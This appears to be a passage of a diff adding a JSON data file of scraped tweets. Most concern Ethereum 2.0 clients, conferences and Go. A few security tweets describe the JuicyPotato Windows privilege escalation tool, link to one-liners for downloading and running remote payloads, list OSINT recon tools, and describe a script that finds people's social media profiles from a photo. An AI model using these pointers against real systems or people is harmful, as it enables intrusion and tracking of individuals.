+            "num_likes": 147,
+            "num_retweets": 47,
+            "num_replies": 3
+        },
+        "1059881948355555328": {
+            "id": "1059881948355555328",
+            "text": "Today we\u2019re rolling out our new Privacy Mode! At first, it is opt-in, but early next week we plan to make this the new default!https://medium.com/metamask/introducing-privacy-mode-42549d4870fa\u00a0\u2026",
+            "username": "metamask_io",
+            "num_likes": 410,
+            "num_retweets": 138,
+            "num_replies": 11
+        },
+        "1058583080980676608": {
+            "id": "1058583080980676608",
+            "text": "Preliminary work on tracking individuals in their home using a smart phone which detects changes in the individuals home WiFi signal as they move about.\nhttps://arxiv.org/abs/1810.10109\u00a0",
+            "username": "AgeManning",
+            "num_likes": 2,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1058388106183929856": {
+            "id": "1058388106183929856",
+            "text": "Leaving Prague after a great #Devcon4 - thanks to everyone who made this @EFDevcon happen! What we have here is very special and precious, keep up the great work everyone! #Ethereum",
+            "username": "ethZed",
+            "num_likes": 25,
+            "num_retweets": 2,
+            "num_replies": 1
+        },
+        "1057766078321958913": {
+            "id": "1057766078321958913",
+            "text": "Today is the 10th anniversary of the Bitcoin white paper, day one of Ethereum #devcon and the second birthday of @sigp_io ",
+            "username": "paulhauner",
+            "num_likes": 9,
+            "num_retweets": 1,
+            "num_replies": 2
+        },
+        "1056880766431440897": {
+            "id": "1056880766431440897",
+            "text": "The first set of breakout groups wraps up. The topics include state execution, DoS attack vectors, client architecture, libp2p, and zk-SNARK use cases.pic.twitter.com/uV9579SMtf",
+            "username": "lrettig",
+            "num_likes": 6,
+            "num_retweets": 3,
+            "num_replies": 1
+        },
+        "1056739321556951040": {
+            "id": "1056739321556951040",
+            "text": "No matter what your opinions on Monero and Zcash are, the Beryllium Bullet and Sapling updates this month have propelled distributed privacy technology to a new level. People can send fast, efficient, and inexpensive transactions anywhere with more privacy than ever before.",
+            "username": "JEhrenhofer",
+            "num_likes": 273,
+            "num_retweets": 60,
+            "num_replies": 9
+        },
+        "1055332504620711942": {
+            "id": "1055332504620711942",
+            "text": "[Blog] How the Ethereum Foundation grants program makes decisions #ethereum #grants #EFGrantshttps://goo.gl/Co7A1T\u00a0",
+            "username": "ethereum",
+            "num_likes": 214,
+            "num_retweets": 74,
+            "num_replies": 45
+        },
+        "1054712104731721728": {
+            "id": "1054712104731721728",
+            "text": "One more thing: we just demonstrated at Web3 a full STARK proof system running over wasm in a browser on a smartphone. First time ever. STARKs are coming (fast).",
+            "username": "StarkWareLtd",
+            "num_likes": 280,
+            "num_retweets": 81,
+            "num_replies": 6
+        },
+        "1054760656900157441": {
+            "id": "1054760656900157441",
+            "text": "We performed a security review for @ethstatus! Check out @ethZed's write-up for more info. Unsurprisingly, they were a pleasure to work with! https://twitter.com/ethZed/status/1054759111710011392\u00a0\u2026",
+            "username": "paulhauner",
+            "num_likes": 9,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1054759111710011392": {
+            "id": "1054759111710011392",
+            "text": "We've just released a new blog post describing a smart contract security review we performed on @ethstatus new ENS registrar https://blog.sigmaprime.io/status-ens-review.html\u00a0\u2026 \n\nWe had a lot of pleasure working with the Status team! Full report available here https://github.com/sigp/public-audits/tree/master/status\u00a0\u2026\n#Ethereum #Infosec",
+            "username": "ethZed",
+            "num_likes": 22,
+            "num_retweets": 10,
+            "num_replies": 1
+        },
+        "1054431989942628353": {
+            "id": "1054431989942628353",
+            "text": "Lighthouse update by @AgeManning:\n \n- EF grant \n- libp2p collabs with @ParityTech\n- fuzzing for vulns by @ethZed\n- block pre-processing merged\n- more contributors \n\nWe\u2019re at the @web3foundation summit this week, come say hello!https://lighthouse.sigmaprime.io/update-02.html\u00a0",
+            "username": "paulhauner",
+            "num_likes": 27,
+            "num_retweets": 8,
+            "num_replies": 1
+        },
+        "1054127412408020992": {
+            "id": "1054127412408020992",
+            "text": "I just published a new blog post! \"How to Participate in Blockchain Governance in Good Faith (and with Good Manners)\"! It's a short one! Enjoy!https://medium.com/@Vlad_Zamfir/how-to-participate-in-blockchain-governance-in-good-faith-and-with-good-manners-bd4e16846434\u00a0\u2026",
+            "username": "VladZamfir",
+            "num_likes": 128,
+            "num_retweets": 47,
+            "num_replies": 12
+        },
+        "1054040154241941506": {
+            "id": "1054040154241941506",
+            "text": "Latest lighthouse update: https://lighthouse.sigmaprime.io/update-02.html\u00a0 \nGitcoin bounties, rust fuzzing, gossipsub and more! :)",
+            "username": "AgeManning",
+            "num_likes": 2,
+            "num_retweets": 1,
+            "num_replies": 0
+        },
+        "1053664308855537664": {
+            "id": "1053664308855537664",
+            "text": "A gentle reminder that if you can\u2019t say anything nice, say it as more of a comment than a question.",
+            "username": "AcademicsSay",
+            "num_likes": 3445,
+            "num_retweets": 735,
+            "num_replies": 23
+        },
+        "1053965060979060739": {
+            "id": "1053965060979060739",
+            "text": "We've just released a new blog post on security considerations for lighthouse, our eth2.0 client: https://lighthouse.sigmaprime.io/fuzzing-lighthouse.html\u00a0\u2026 #Ethereum #infosec #shasper #fuzzing",
+            "username": "ethZed",
+            "num_likes": 26,
+            "num_retweets": 13,
+            "num_replies": 0
+        },
+        "1053787766197288962": {
+            "id": "1053787766197288962",
+            "text": "Check out how to make Ethereum's Bloom filters totally useless for only .3 USD per block :)\n\nGiven recent conversations about Blooms, might be interesting @nicksdjohnson @VladZamfir @VitalikButerinhttps://twitter.com/kelvinfichter/status/1053786742606696448\u00a0\u2026",
+            "username": "naterush1997",
+            "num_likes": 41,
+            "num_retweets": 5,
+            "num_replies": 0
+        },
+        "1052648788194660352": {
+            "id": "1052648788194660352",
+            "text": "Eth2.0 Implementers Call #5 notes\nhttps://github.com/ethereum/eth2.0-pm/blob/master/eth2.0-implementers-calls/call_005.md\u00a0\u2026\n\nSpecial thanks to Peter Gallagher.",
+            "username": "dannyryan",
+            "num_likes": 36,
+            "num_retweets": 8,
+            "num_replies": 0
+        },
+        "1052235795162128386": {
+            "id": "1052235795162128386",
+            "text": "I'm attending a conference soon. They've sent out a registration QR code, pointing to a URL ending in a seq num. Change the number and you can access every attendees private info... I pinged them, and after a week of hotfixing, the URL now ends in md5(seq num). I can't even...",
+            "username": "peter_szilagyi",
+            "num_likes": 124,
+            "num_retweets": 25,
+            "num_replies": 8
+        },
+        "1049415522528313345": {
+            "id": "1049415522528313345",
+            "text": "Here's the promised write-up on the Sharding PoC that I, @VladZamfir and @adiasg were working on at @ETHSanFrancisco:https://medium.com/nearprotocol/37e538177ed9\u00a0\u2026",
+            "username": "AlexSkidanov",
+            "num_likes": 42,
+            "num_retweets": 16,
+            "num_replies": 0
+        },
+        "1049714416281763840": {
+            "id": "1049714416281763840",
+            "text": "Check out this visualization of the X-shard message routing and shard rotation PoC that @adiasg @AlexSkidanov and anonymous others and I hacked together at @ETHSanFrancisco!pic.twitter.com/X9d31Ywugs",
+            "username": "VladZamfir",
+            "num_likes": 230,
+            "num_retweets": 53,
+            "num_replies": 13
+        },
+        "1051886425753436166": {
+            "id": "1051886425753436166",
+            "text": "[Blog] Ethereum Foundation Grants Update - Wave IV #ethereum #grants https://goo.gl/4bzKyD\u00a0pic.twitter.com/gu0csjFlNk",
+            "username": "ethereum",
+            "num_likes": 281,
+            "num_retweets": 102,
+            "num_replies": 34
+        },
+        "1051935107496300544": {
+            "id": "1051935107496300544",
+            "text": "We\u2019re very excited to receive a grant for our Shasper client from the Ethereum Foundation! \n\nWe\u2019ve been building Lighthouse since the earliest days of the spec and we\u2019ll continue building with maximal intensity! Eth is gonna scale!!https://blog.ethereum.org/2018/10/15/ethereum-foundation-grants-update-wave-4/\u00a0\u2026",
+            "username": "paulhauner",
+            "num_likes": 108,
+            "num_retweets": 26,
+            "num_replies": 4
+        },
+        "1049025276343197696": {
+            "id": "1049025276343197696",
+            "text": "Latest edition of \"What's new in Eth2\" is out a day early! #ethereumhttps://drive.google.com/open?id=1yDoXocazwE0LRDTQbm2yGz_3MkIL0f32xQVRt1nTKig\u00a0\u2026",
+            "username": "benjaminion_xyz",
+            "num_likes": 28,
+            "num_retweets": 8,
+            "num_replies": 2
+        },
+        "1047076670971240448": {
+            "id": "1047076670971240448",
+            "text": "Have you heard of Sparse Merkle Trees? They are neat cryptographic primitives that enable proof of non-inclusion. Could they replace Patricia trees in Ethereum?https://medium.com/@kelvinfichter/whats-a-sparse-merkle-tree-acda70aeb837\u00a0\u2026",
+            "username": "ethZed",
+            "num_likes": 9,
+            "num_retweets": 2,
+            "num_replies": 0
+        },
+        "1047179216049958912": {
+            "id": "1047179216049958912",
+            "text": "Casper+sharding bi-weekly development update from @prylabs. Oh @ShasperS is gonna love this one.https://medium.com/prysmatic-labs/ethereum-2-0-casper-sharding-development-update-14-prysmatic-labs-349a97a8c627\u00a0\u2026",
+            "username": "terencechain",
+            "num_likes": 25,
+            "num_retweets": 8,
+            "num_replies": 0
+        },
+        "1046430522480775168": {
+            "id": "1046430522480775168",
+            "text": "Notes from Eth2.0 Implementers Call 4. Now with timestamps!\nhttps://github.com/ethereum/eth2.0-pm/blob/master/eth2.0-implementers-calls/call_004.md\u00a0\u2026\n\n[Special thanks to Peter for putting these together]",
+            "username": "dannyryan",
+            "num_likes": 39,
+            "num_retweets": 7,
+            "num_replies": 1
+        },
+        "1045279151744118785": {
+            "id": "1045279151744118785",
+            "text": "Sigma Prime has two core offerings; our Eth 2.0 client and infosec services. On our core team we have experienced security professionals targeting smart contract security. \n\nHere\u2019s an example of what you can expect when you engage us: https://github.com/sigp/havven-audit/tree/master/2018-06-06_b5a6cdb\u00a0\u2026 (It\u2019s the PDF)",
+            "username": "paulhauner",
+            "num_likes": 9,
+            "num_retweets": 4,
+            "num_replies": 1
+        },
+        "1044682754238160901": {
+            "id": "1044682754238160901",
+            "text": "Leap  - a State-Enabled Computing Model for Plasma \nhttps://ethresear.ch/t/plasma-leap-a-state-enabled-computing-model-for-plasma/3539\u00a0\u2026\n#etherem #plasma #dapp",
+            "username": "JohBa",
+            "num_likes": 22,
+            "num_retweets": 3,
+            "num_replies": 0
+        },
+        "1044525235796508674": {
+            "id": "1044525235796508674",
+            "text": "JuicyPotato - A useful tool to Escalate from Windows Service Account to NT AUTHORITY\\SYSTEM\n\nhttps://ohpe.it/juicy-potato/\u00a0\n\n1. User needs SeImpersonate or SeAssignPrimaryToken privileges.\n2. Uses COM Objects to escalate the privilege.",
+            "username": "c0d3inj3cT",
+            "num_likes": 231,
+            "num_retweets": 139,
+            "num_replies": 1
+        },
+        "1044634073099120640": {
+            "id": "1044634073099120640",
+            "text": "Want to get involved with an Eth2.0 client implementation?\n\nLighthouse (a beacon chain in Rust led by @paulhauner ) has an open issue for refactoring some bitfield utilities. Looks like a great way to get started with their project and Eth2.0 in general.https://github.com/sigp/lighthouse/issues/22\u00a0\u2026",
+            "username": "dannyryan",
+            "num_likes": 34,
+            "num_retweets": 8,
+            "num_replies": 1
+        },
+        "1044229090608177152": {
+            "id": "1044229090608177152",
+            "text": "Awesome #golang tips that don't get shared enough https://go101.org/article/tips.html\u00a0\u2026",
+            "username": "terencechain",
+            "num_likes": 6,
+            "num_retweets": 3,
+            "num_replies": 0
+        },
+        "1042246286454415360": {
+            "id": "1042246286454415360",
+            "text": "#OSINT and recon tools! \nOSINT Framework\nCheckUserNames\nHaveIbeenPwned\nBeenVerified\nCensys\nBuscador\nUnicornscan\nBuiltWith\nGoogle Dorks\nMaltego\nRecon-Ng\ntheHarvester\nMetagoofil\nGHDB\nOpenVAS\nNmap\nShodan\nJigsaw\nSpiderFoot\nWebShag\nCreepy\nFierce\nFOCA\n... am i missing any?",
+            "username": "winter_heidi",
+            "num_likes": 1516,
+            "num_retweets": 599,
+            "num_replies": 90
+        },
+        "1042157604397608960": {
+            "id": "1042157604397608960",
+            "text": "Notes from eth2.0 Implementers Call #3https://github.com/ethresearch/eth2.0-pm/blob/master/eth2.0-implementers-calls/call_003.md\u00a0\u2026",
+            "username": "dannyryan",
+            "num_likes": 35,
+            "num_retweets": 10,
+            "num_replies": 0
+        },
+        "1038290203192909826": {
+            "id": "1038290203192909826",
+            "text": "Just watched latest #shasper talk by @drakefjustin at @TechCrunch. Loved how Justin expressed complex Ideas Into simple concepts.\nWhat I didn't know:\n\u2022 One more actor notary for proof of custody\n\u2022 Cross link contains more than just shard check pointshttps://www.youtube.com/watch?v=J6xO7DH20Js\u00a0\u2026",
+            "username": "terencechain",
+            "num_likes": 32,
+            "num_retweets": 8,
+            "num_replies": 0
+        },
+        "1037940716016558080": {
+            "id": "1037940716016558080",
+            "text": "Ethereum 2.0: Who's building it?https://medium.com/rocket-pool/ethereum-2-0-whos-building-it-54a735442e\u00a0\u2026",
+            "username": "VitalikButerin",
+            "num_likes": 3344,
+            "num_retweets": 1261,
+            "num_replies": 271
+        },
+        "1037570071328043008": {
+            "id": "1037570071328043008",
+            "text": "Mark your calendars!!\n\nWAVE 3 Ticket Sale Details: MON September 10 at 4pm PT \n\n(which is TUE September 11 at 12am London, 1am Berlin, 7am Beijing, 8am Japan, 9am Sydney, just to name a few)",
+            "username": "EFDevcon",
+            "num_likes": 67,
+            "num_retweets": 13,
+            "num_replies": 5
+        },
+        "1037023587666980864": {
+            "id": "1037023587666980864",
+            "text": "A giant GitHub repo with all kinds of infosec cheatsheets\n\nhttps://github.com/OlivierLaflamme/Cheatsheet-God\u00a0\u2026pic.twitter.com/4Ng7hvqg9S",
+            "username": "campuscodi",
+            "num_likes": 537,
+            "num_retweets": 294,
+            "num_replies": 2
+        },
+        "1036715482664054785": {
+            "id": "1036715482664054785",
+            "text": "Sign-up to Shodan with an academic email address (ex: .edu, .ac.uk) to receive an automatic, free upgrade! Don't have an academic TLD? Email academic@shodan.io for a manual upgrade",
+            "username": "shodanhq",
+            "num_likes": 374,
+            "num_retweets": 199,
+            "num_replies": 21
+        },
+        "1036991595479007232": {
+            "id": "1036991595479007232",
+            "text": "Notes from the last Eth2.0 Implementers Callhttps://github.com/ethresearch/eth2.0-pm/blob/master/eth2.0-implementers-calls/call_002.md\u00a0\u2026",
+            "username": "dannyryan",
+            "num_likes": 35,
+            "num_retweets": 5,
+            "num_replies": 0
+        },
+        "1036457068973064192": {
+            "id": "1036457068973064192",
+            "text": "Already replied.https://www.reddit.com/r/ethtrader/comments/9ch5ls/comment/e5av470\u00a0\u2026",
+            "username": "VitalikButerin",
+            "num_likes": 361,
+            "num_retweets": 73,
+            "num_replies": 20
+        },
+        "1034830176998313986": {
+            "id": "1034830176998313986",
+            "text": "Just released Geth v1.8.15 (Khazad-d\u00fbm\u00b2), fixing a few issues and adding some juicy uncle inclusion mechanisms for miners! Once again, big thanks to @peter_bitfly for helping drive and test this release! #golang #Ethereumhttps://github.com/ethereum/go-ethereum/releases/tag/v1.8.15\u00a0\u2026",
+            "username": "peter_szilagyi",
+            "num_likes": 54,
+            "num_retweets": 25,
+            "num_replies": 3
+        },
+        "1034471897948454912": {
+            "id": "1034471897948454912",
+            "text": " We just announced an update for Go 2! \n\nThis includes preliminary draft designs for generics, error handling, and error values. \n\nRead our blog and watch the video by @_rsc for more information. \n\nhttps://buff.ly/2okToPb\u00a0",
+            "username": "golang",
+            "num_likes": 2515,
+            "num_retweets": 1289,
+            "num_replies": 50
+        },
+        "1033750617003618304": {
+            "id": "1033750617003618304",
+            "text": "Windows oneliners to download remote payload and execute arbitrary codehttps://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/\u00a0\u2026",
+            "username": "DirectoryRanger",
+            "num_likes": 171,
+            "num_retweets": 77,
+            "num_replies": 0
+        },
+        "1033480211055169536": {
+            "id": "1033480211055169536",
+            "text": "Better late than never! Eth2.0 Implementers Call #1 notes/links/etc:https://github.com/ethresearch/eth2.0-pm/blob/master/eth2.0-implementers-calls/call_001.md\u00a0\u2026",
+            "username": "dannyryan",
+            "num_likes": 47,
+            "num_retweets": 11,
+            "num_replies": 1
+        },
+        "1032929916826861568": {
+            "id": "1032929916826861568",
+            "text": "Hey all! I'd really like for the #golang #Ethereum team to have a public presence again after the Foundation moved off of gitter a while back, so we've set up a Discord server for anyone to join. It's an experiment to bring the questions back near the devshttps://discord.gg/nthXNEv\u00a0",
+            "username": "peter_szilagyi",
+            "num_likes": 72,
+            "num_retweets": 26,
+            "num_replies": 1
+        },
+        "1032626114030698496": {
+            "id": "1032626114030698496",
+            "text": "Hats off to @Snyke for putting this together with the aim of including as many #academic research papers as possible into once place. The most comprehensive list of publications we have come across thus far on #Bitcoin and #Blockchain #technology.  \nhttps://cdecker.github.io/btcresearch/\u00a0",
+            "username": "work_blockchain",
+            "num_likes": 15,
+            "num_retweets": 7,
+            "num_replies": 2
+        },
+        "1029900695925706753": {
+            "id": "1029900695925706753",
+            "text": "1. Today I am going to make a tweet storm explaining the history and state of Ethereum's Casper research, including the FFG vs CBC wars, the hybrid => full switch, the role of randomness, mechanism design issues, and more.",
+            "username": "VitalikButerin",
+            "num_likes": 3736,
+            "num_retweets": 1258,
+            "num_replies": 165
+        },
+        "1030028863512997888": {
+            "id": "1030028863512997888",
+            "text": "Some insights on gas usage of #Solidity code:https://github.com/ethereum/solidity/issues/4830\u00a0\u2026",
+            "username": "ethchris",
+            "num_likes": 18,
+            "num_retweets": 7,
+            "num_replies": 0
+        },
+        "1026979337613058053": {
+            "id": "1026979337613058053",
+            "text": "Finally published the libsnark zk-SNARK tutorial I wrote in collaboration with Sam Mayo! Take a look! https://github.com/christianlundkvist/libsnark-tutorial\u00a0\u2026",
+            "username": "ChrisLundkvist",
+            "num_likes": 74,
+            "num_retweets": 24,
+            "num_replies": 5
+        },
+        "1026775392890351616": {
+            "id": "1026775392890351616",
+            "text": "pic.twitter.com/UYZ3cX3MLz",
+            "username": "dostoevskylabs",
+            "num_likes": 914,
+            "num_retweets": 291,
+            "num_replies": 23
+        },
+        "1026295237776367616": {
+            "id": "1026295237776367616",
+            "text": "Burner phone\nBurner laptop\nBurner wallet\nBurner clothes\nBurner car\nBurner voting machine\nBurner vape pen\nBurner dildo\nBurner smart watch\nBurner smart kettle\nBurner Fitbit\nBurner drone\nBurner bluetooth headphones\nBurner ethernet cable\nBurner shoes\n\nThat should cover #defcon",
+            "username": "mainframed767",
+            "num_likes": 717,
+            "num_retweets": 170,
+            "num_replies": 70
+        },
+        "1026248336817324032": {
+            "id": "1026248336817324032",
+            "text": "Our community, myself included, is particularly guilty of not thoughtfully considering research societal impacts (esp the negative ones!). Great call to action @jeffbigham. Will be linking to this in many of my future peer reviews.https://acm-fca.org/2018/03/29/negativeimpacts/\u00a0\u2026",
+            "username": "BarnesMJ",
+            "num_likes": 15,
+            "num_retweets": 8,
+            "num_replies": 0
+        },
+        "1026340194851553282": {
+            "id": "1026340194851553282",
+            "text": "having reviewed all ~550 @defcon talks over the course of a hellish 4 months, here's the 10 that i'm most stoked to see:pic.twitter.com/6VN6VXtZKt",
+            "username": "bcrypt",
+            "num_likes": 626,
+            "num_retweets": 148,
+            "num_replies": 13
+        },
+        "1026157260819509248": {
+            "id": "1026157260819509248",
+            "text": "When computing the average of two numbers, yes, (a+b)/2 is the definition, but it's often a very suboptimal algorithm for *calculating* it in practice. Most of the time, you want a + (b-a)/2; numbers that get averaged tend to be close together so this requires less computation.",
+            "username": "VitalikButerin",
+            "num_likes": 2161,
+            "num_retweets": 534,
+            "num_replies": 136
+        },
+        "1026200556858036224": {
+            "id": "1026200556858036224",
+            "text": "Now live: http://Polkadash.io\u00a0! Track how well current validators are doing in real time by referencing the Lateness entry. For governance, you can track current proposals and referendums.",
+            "username": "polkadotnetwork",
+            "num_likes": 59,
+            "num_retweets": 19,
+            "num_replies": 3
+        },
+        "1022534132415356928": {
+            "id": "1022534132415356928",
+            "text": "If you put chalk under a powerful microscope\u2014white cliffs of Dover type chalk, not the modern blackboard variety\u2014you will see something like this\n\nBecause it's not just a rock. It's an accumulation of ancient skeletons: the armored husks of single-celled, ocean-dwelling planktonpic.twitter.com/ZBGZb4aKLd",
+            "username": "ferrisjabr",
+            "num_likes": 56228,
+            "num_retweets": 18856,
+            "num_replies": 621
+        },
+        "1020679615847821312": {
+            "id": "1020679615847821312",
+            "text": "I have a hobby project. I want to obsolete #Facebook. I want a social network that is private by design, decentralized by design, trustless by design. I don't know if I can achieve it, but I'll document my journey. 1st post of @ipsnio: https://medium.com/interplanetary-social-network/a-pinch-of-privacy-tor-from-within-go-fc4b09986120\u00a0\u2026 @torproject #golang",
+            "username": "peter_szilagyi",
+            "num_likes": 238,
+            "num_retweets": 71,
+            "num_replies": 13
+        },
+        "1019869462504370177": {
+            "id": "1019869462504370177",
+            "text": "#Ethereum will be 3 years old in ~10 days. During that time we had 5 consensus updates, 136 #golang Geth updates and 199 #rustlang Parity updates. DoS attacks included, the uptime of Ethereum is 100%! Not 9-nines... a big frigging 100! Not an 8 month trial (AXD301), 3 years live!",
+            "username": "peter_szilagyi",
+            "num_likes": 628,
+            "num_retweets": 212,
+            "num_replies": 18
+        },
+        "1020037519969333248": {
+            "id": "1020037519969333248",
+            "text": "It's been one year since the first Parity multisig wallet hack! #codeislaw",
+            "username": "VladZamfir",
+            "num_likes": 225,
+            "num_retweets": 33,
+            "num_replies": 31
+        },
+        "1019323196745637889": {
+            "id": "1019323196745637889",
+            "text": "I talk about sharding at the IC3 workshop!\n\nhttps://vitalik.ca/files/Ithaca201807_Sharding.pdf\u00a0\u2026",
+            "username": "VitalikButerin",
+            "num_likes": 618,
+            "num_retweets": 143,
+            "num_replies": 47
+        },
+        "1019137430845157376": {
+            "id": "1019137430845157376",
+            "text": "Our Rust implementation of the Ethereum Beacon Chain spec is now 99% on-par with the reference impl. We're missing a few BLS features and a couple of integration tests.\n\nIt's called \"Lighthouse\" -- another form of rusty beacon. You can find it here:https://github.com/sigp/lighthouse\u00a0",
+            "username": "paulhauner",
+            "num_likes": 88,
+            "num_retweets": 24,
+            "num_replies": 8
+        },
+        "1017424747238445056": {
+            "id": "1017424747238445056",
+            "text": "did you remember to pack all your dongles?\n\nHDMI \u2192 VGA\nUSBC \u2192 RCA\nCAT5 \u2190 RS232\nVGA \u21c6 NTSC\nUDP \u21c9 Thunderlizard\nGLSL \u2193 IETF\nWebDAV \u21e0 GTA5\nIMF \u219e MIDI\nSCOTUS \u21e8 ICJ\nIDK \u21ab WWE\nCCCP \u21ad BotW\nLMAO \u219d DIY\nADHD \u21af IRL\nUSA \u2192 DSA",
+            "username": "computerfact",
+            "num_likes": 1665,
+            "num_retweets": 423,
+            "num_replies": 25
+        },
+        "1017842667609382920": {
+            "id": "1017842667609382920",
+            "text": "Episode 25 is up! Miner Security, Bancor Hacked, False Top-Up #Ethereum Vulnerability, and Opera #Cryptocurrency Wallet - https://coinsecpodcast.com/episode-25-miner-security-bancor-hacked-false-top-up-ethereum-vulnerability-and-opera-cryptocurrency-wallet/\u00a0\u2026",
+            "username": "CoinSecPodcast",
+            "num_likes": 12,
+            "num_retweets": 8,
+            "num_replies": 1
+        },
+        "1017769772547747841": {
+            "id": "1017769772547747841",
+            "text": "[LIVE] Ethereum Core Developer Meeting #42 [07/13/18]https://goo.gl/Y2vPZD\u00a0",
+            "username": "ethereum",
+            "num_likes": 146,
+            "num_retweets": 55,
+            "num_replies": 47
+        },
+        "1017442086272958464": {
+            "id": "1017442086272958464",
+            "text": "don\u2019t run npm update today lolhttps://www.bleepingcomputer.com/news/security/compromised-javascript-package-caught-stealing-npm-credentials/\u00a0\u2026",
+            "username": "bcrypt",
+            "num_likes": 579,
+            "num_retweets": 449,
+            "num_replies": 14
+        },
+        "1016728855258845185": {
+            "id": "1016728855258845185",
+            "text": "Scam fighters ftwhttps://etherscamdb.info\u00a0",
+            "username": "VladZamfir",
+            "num_likes": 40,
+            "num_retweets": 10,
+            "num_replies": 6
+        },
+        "1014805705310777346": {
+            "id": "1014805705310777346",
+            "text": "Great write up of a few RCEs and SQLIs on MicroFocus Secure Messaging Gateway. https://pentest.blog/unexpected-journey-6-all-ways-lead-to-rome-remote-code-execution-on-microfocus-secure-messaging-gateway/\u00a0\u2026\n#pentest #infosec",
+            "username": "ethZed",
+            "num_likes": 8,
+            "num_retweets": 5,
+            "num_replies": 2
+        },
+        "1014197467326316551": {
+            "id": "1014197467326316551",
+            "text": "$  history | awk -F\\  '{ $1=\"\"; print $0; }' | sort | uniq | wc -l\n\nThis command should tell you how many unique shell commands you've fired so far. You should have $HISTFILESIZE set to a large number or not set at all, to store lots of command history.\n#linux @nixcraft @climagic",
+            "username": "curioman2",
+            "num_likes": 222,
+            "num_retweets": 83,
+            "num_replies": 6
+        },
+        "1014583371626958848": {
+            "id": "1014583371626958848",
+            "text": "EagleEye - a script to which you can feed a person's image and will spew out possible social media profiles for that person\n\nhttps://github.com/ThoughtfulDev/EagleEye\u00a0\u2026pic.twitter.com/Gg4AwN3v40",
+            "username": "campuscodi",
+            "num_likes": 471,
+            "num_retweets": 171,
+            "num_replies": 2
+        },
+        "1014557961321091075": {
+            "id": "1014557961321091075",
+            "text": "The reason why \"whitepapers\" are called whitepapers, and not papers, is that they are not peer-reviewed. Most whitepapers out there would not withstand peer scrutiny.",
+            "username": "el33th4xor",
+            "num_likes": 1048,
+            "num_retweets": 228,
+            "num_replies": 56
+        },
+        "1014256375726305280": {
+            "id": "1014256375726305280",
+            "text": "Mark your calendars! Devcon4 tickets go on sale at 8AM PDT on July 9. Read about our Devcon4 ticketing process here: https://goo.gl/QX5pPj\u00a0pic.twitter.com/2BNFr2x1va",
+            "username": "ethereum",
+            "num_likes": 348,
+            "num_retweets": 146,
+            "num_replies": 35
+        },
+        "1013926975927287810": {
+            "id": "1013926975927287810",
+            "text": "Big surprise, IOTA has a biased key generator.\n\nThis was the first rookie mistake on @colmmacc's recent \"How to generate a random number\" thread: https://twitter.com/colmmacc/status/1012721284092973056\u00a0\u2026 https://twitter.com/puellavulnerata/status/1013906986717581313\u00a0\u2026",
+            "username": "sweis",
+            "num_likes": 72,
+            "num_retweets": 32,
+            "num_replies": 8
+        },
+        "1012912351853645824": {
+            "id": "1012912351853645824",
+            "text": "Blockchains are currently unaware of each other's existence. Each chain's features, value, and security are isolated in silos.\n\n@rphmeier explains how Polkadot solves this by providing the connectivity layer for Web 3. https://youtu.be/DTkWGJZPcz0\u00a0",
+            "username": "polkadotnetwork",
+            "num_likes": 79,
+            "num_retweets": 23,
+            "num_replies": 5
+        },
+        "1012701416857657347": {
+            "id": "1012701416857657347",
+            "text": "To quote Jaco: #Polkadot JS is syncing from @polkadotnetwork Rust over @libp2p for the first time today.pic.twitter.com/us5lQSVKRG",
+            "username": "gavofyork",
+            "num_likes": 97,
+            "num_retweets": 25,
+            "num_replies": 4
+        },
+        "1013094104773820416": {
+            "id": "1013094104773820416",
+            "text": "Slides: https://chriseth.github.io/notes/talks/verifying_offchain_computations/\u00a0\u2026",
+            "username": "ethchris",
+            "num_likes": 7,
+            "num_retweets": 2,
+            "num_replies": 1
+        },
+        "1012696130998734848": {
+            "id": "1012696130998734848",
+            "text": "[LIVE] Ethereum Core Developer Meeting #41 [06/29/18]https://goo.gl/ByswGE\u00a0",
+            "username": "ethereum",
+            "num_likes": 150,
+            "num_retweets": 57,
+            "num_replies": 47
+        },
+        "1013125961569767424": {
+            "id": "1013125961569767424",
+            "text": "I decided to start publishing some of my one-off scripts: https://github.com/EdOverflow/hacks\u00a0\u2026.",
+            "username": "EdOverflow",
+            "num_likes": 174,
+            "num_retweets": 47,
+            "num_replies": 2
+        },
+        "1012055611603763201": {
+            "id": "1012055611603763201",
+            "text": "best programming languages ranked\n\n10. every\n9. programming language\n8. has its\n7. own unique\n6. features and\n5. mechanics \n4. so they shouldn't\n3. be ranked\n2. in a list\n1. @GoLang",
+            "username": "KukicAdo",
+            "num_likes": 610,
+            "num_retweets": 167,
+            "num_replies": 17
+        },
+        "1012371410067456002": {
+            "id": "1012371410067456002",
+            "text": "we just shipped experimental Tor tabs in Brave desktop, a feature that our team has been working on since February!https://brave.com/tor-tabs-beta/\u00a0",
+            "username": "bcrypt",
+            "num_likes": 894,
+            "num_retweets": 211,
+            "num_replies": 20
+        },
+        "1011643134449774594": {
+            "id": "1011643134449774594",
+            "text": "Get started with Polkadot! @EAThomson makes setting-up a testnet node easy with this guide.https://medium.com/polkadot-network/setting-up-a-validator-node-in-polkadot-poc-1-96526ae000c3\u00a0\u2026",
+            "username": "polkadotnetwork",
+            "num_likes": 40,
+            "num_retweets": 11,
+            "num_replies": 1
+        },
+        "1011626284806492163": {
+            "id": "1011626284806492163",
+            "text": "ls -ld */*/ # Quickly list the directories that are two levels down without having to do something more complex with 'find'.",
+            "username": "climagic",
+            "num_likes": 190,
+            "num_retweets": 62,
+            "num_replies": 7
+        },
+        "1011240205800693760": {
+            "id": "1011240205800693760",
+            "text": "Attn all cryptocurrency researchers: The BITCOIN workshop is now *merged* into Financial Cryptography this year http://fc19.ifca.ai/cfp.html\u00a0 This means SUBMIT YOUR PAPERS IN SEPTEMBER theres no later deadline like previously @paddyucl @srg @el33th4xor @Ethan_Heilman @real_or_random",
+            "username": "socrates1024",
+            "num_likes": 108,
+            "num_retweets": 35,
+            "num_replies": 6
+        },
+        "1010137695664951297": {
+            "id": "1010137695664951297",
+            "text": "Who made this? ......pic.twitter.com/TgTiYBpMMy",
+            "username": "drewconway",
+            "num_likes": 23900,
+            "num_retweets": 10481,
+            "num_replies": 160
+        },
+        "1009982855697649664": {
+            "id": "1009982855697649664",
+            "text": "[Blog] Announcing Swarm Proof-of-Concept Release 3 #swarm https://goo.gl/6V9ohL\u00a0pic.twitter.com/OcMPSbHiCG",
+            "username": "ethereum",
+            "num_likes": 329,
+            "num_retweets": 132,
+            "num_replies": 52
+        },
+        "1009833954122362880": {
+            "id": "1009833954122362880",
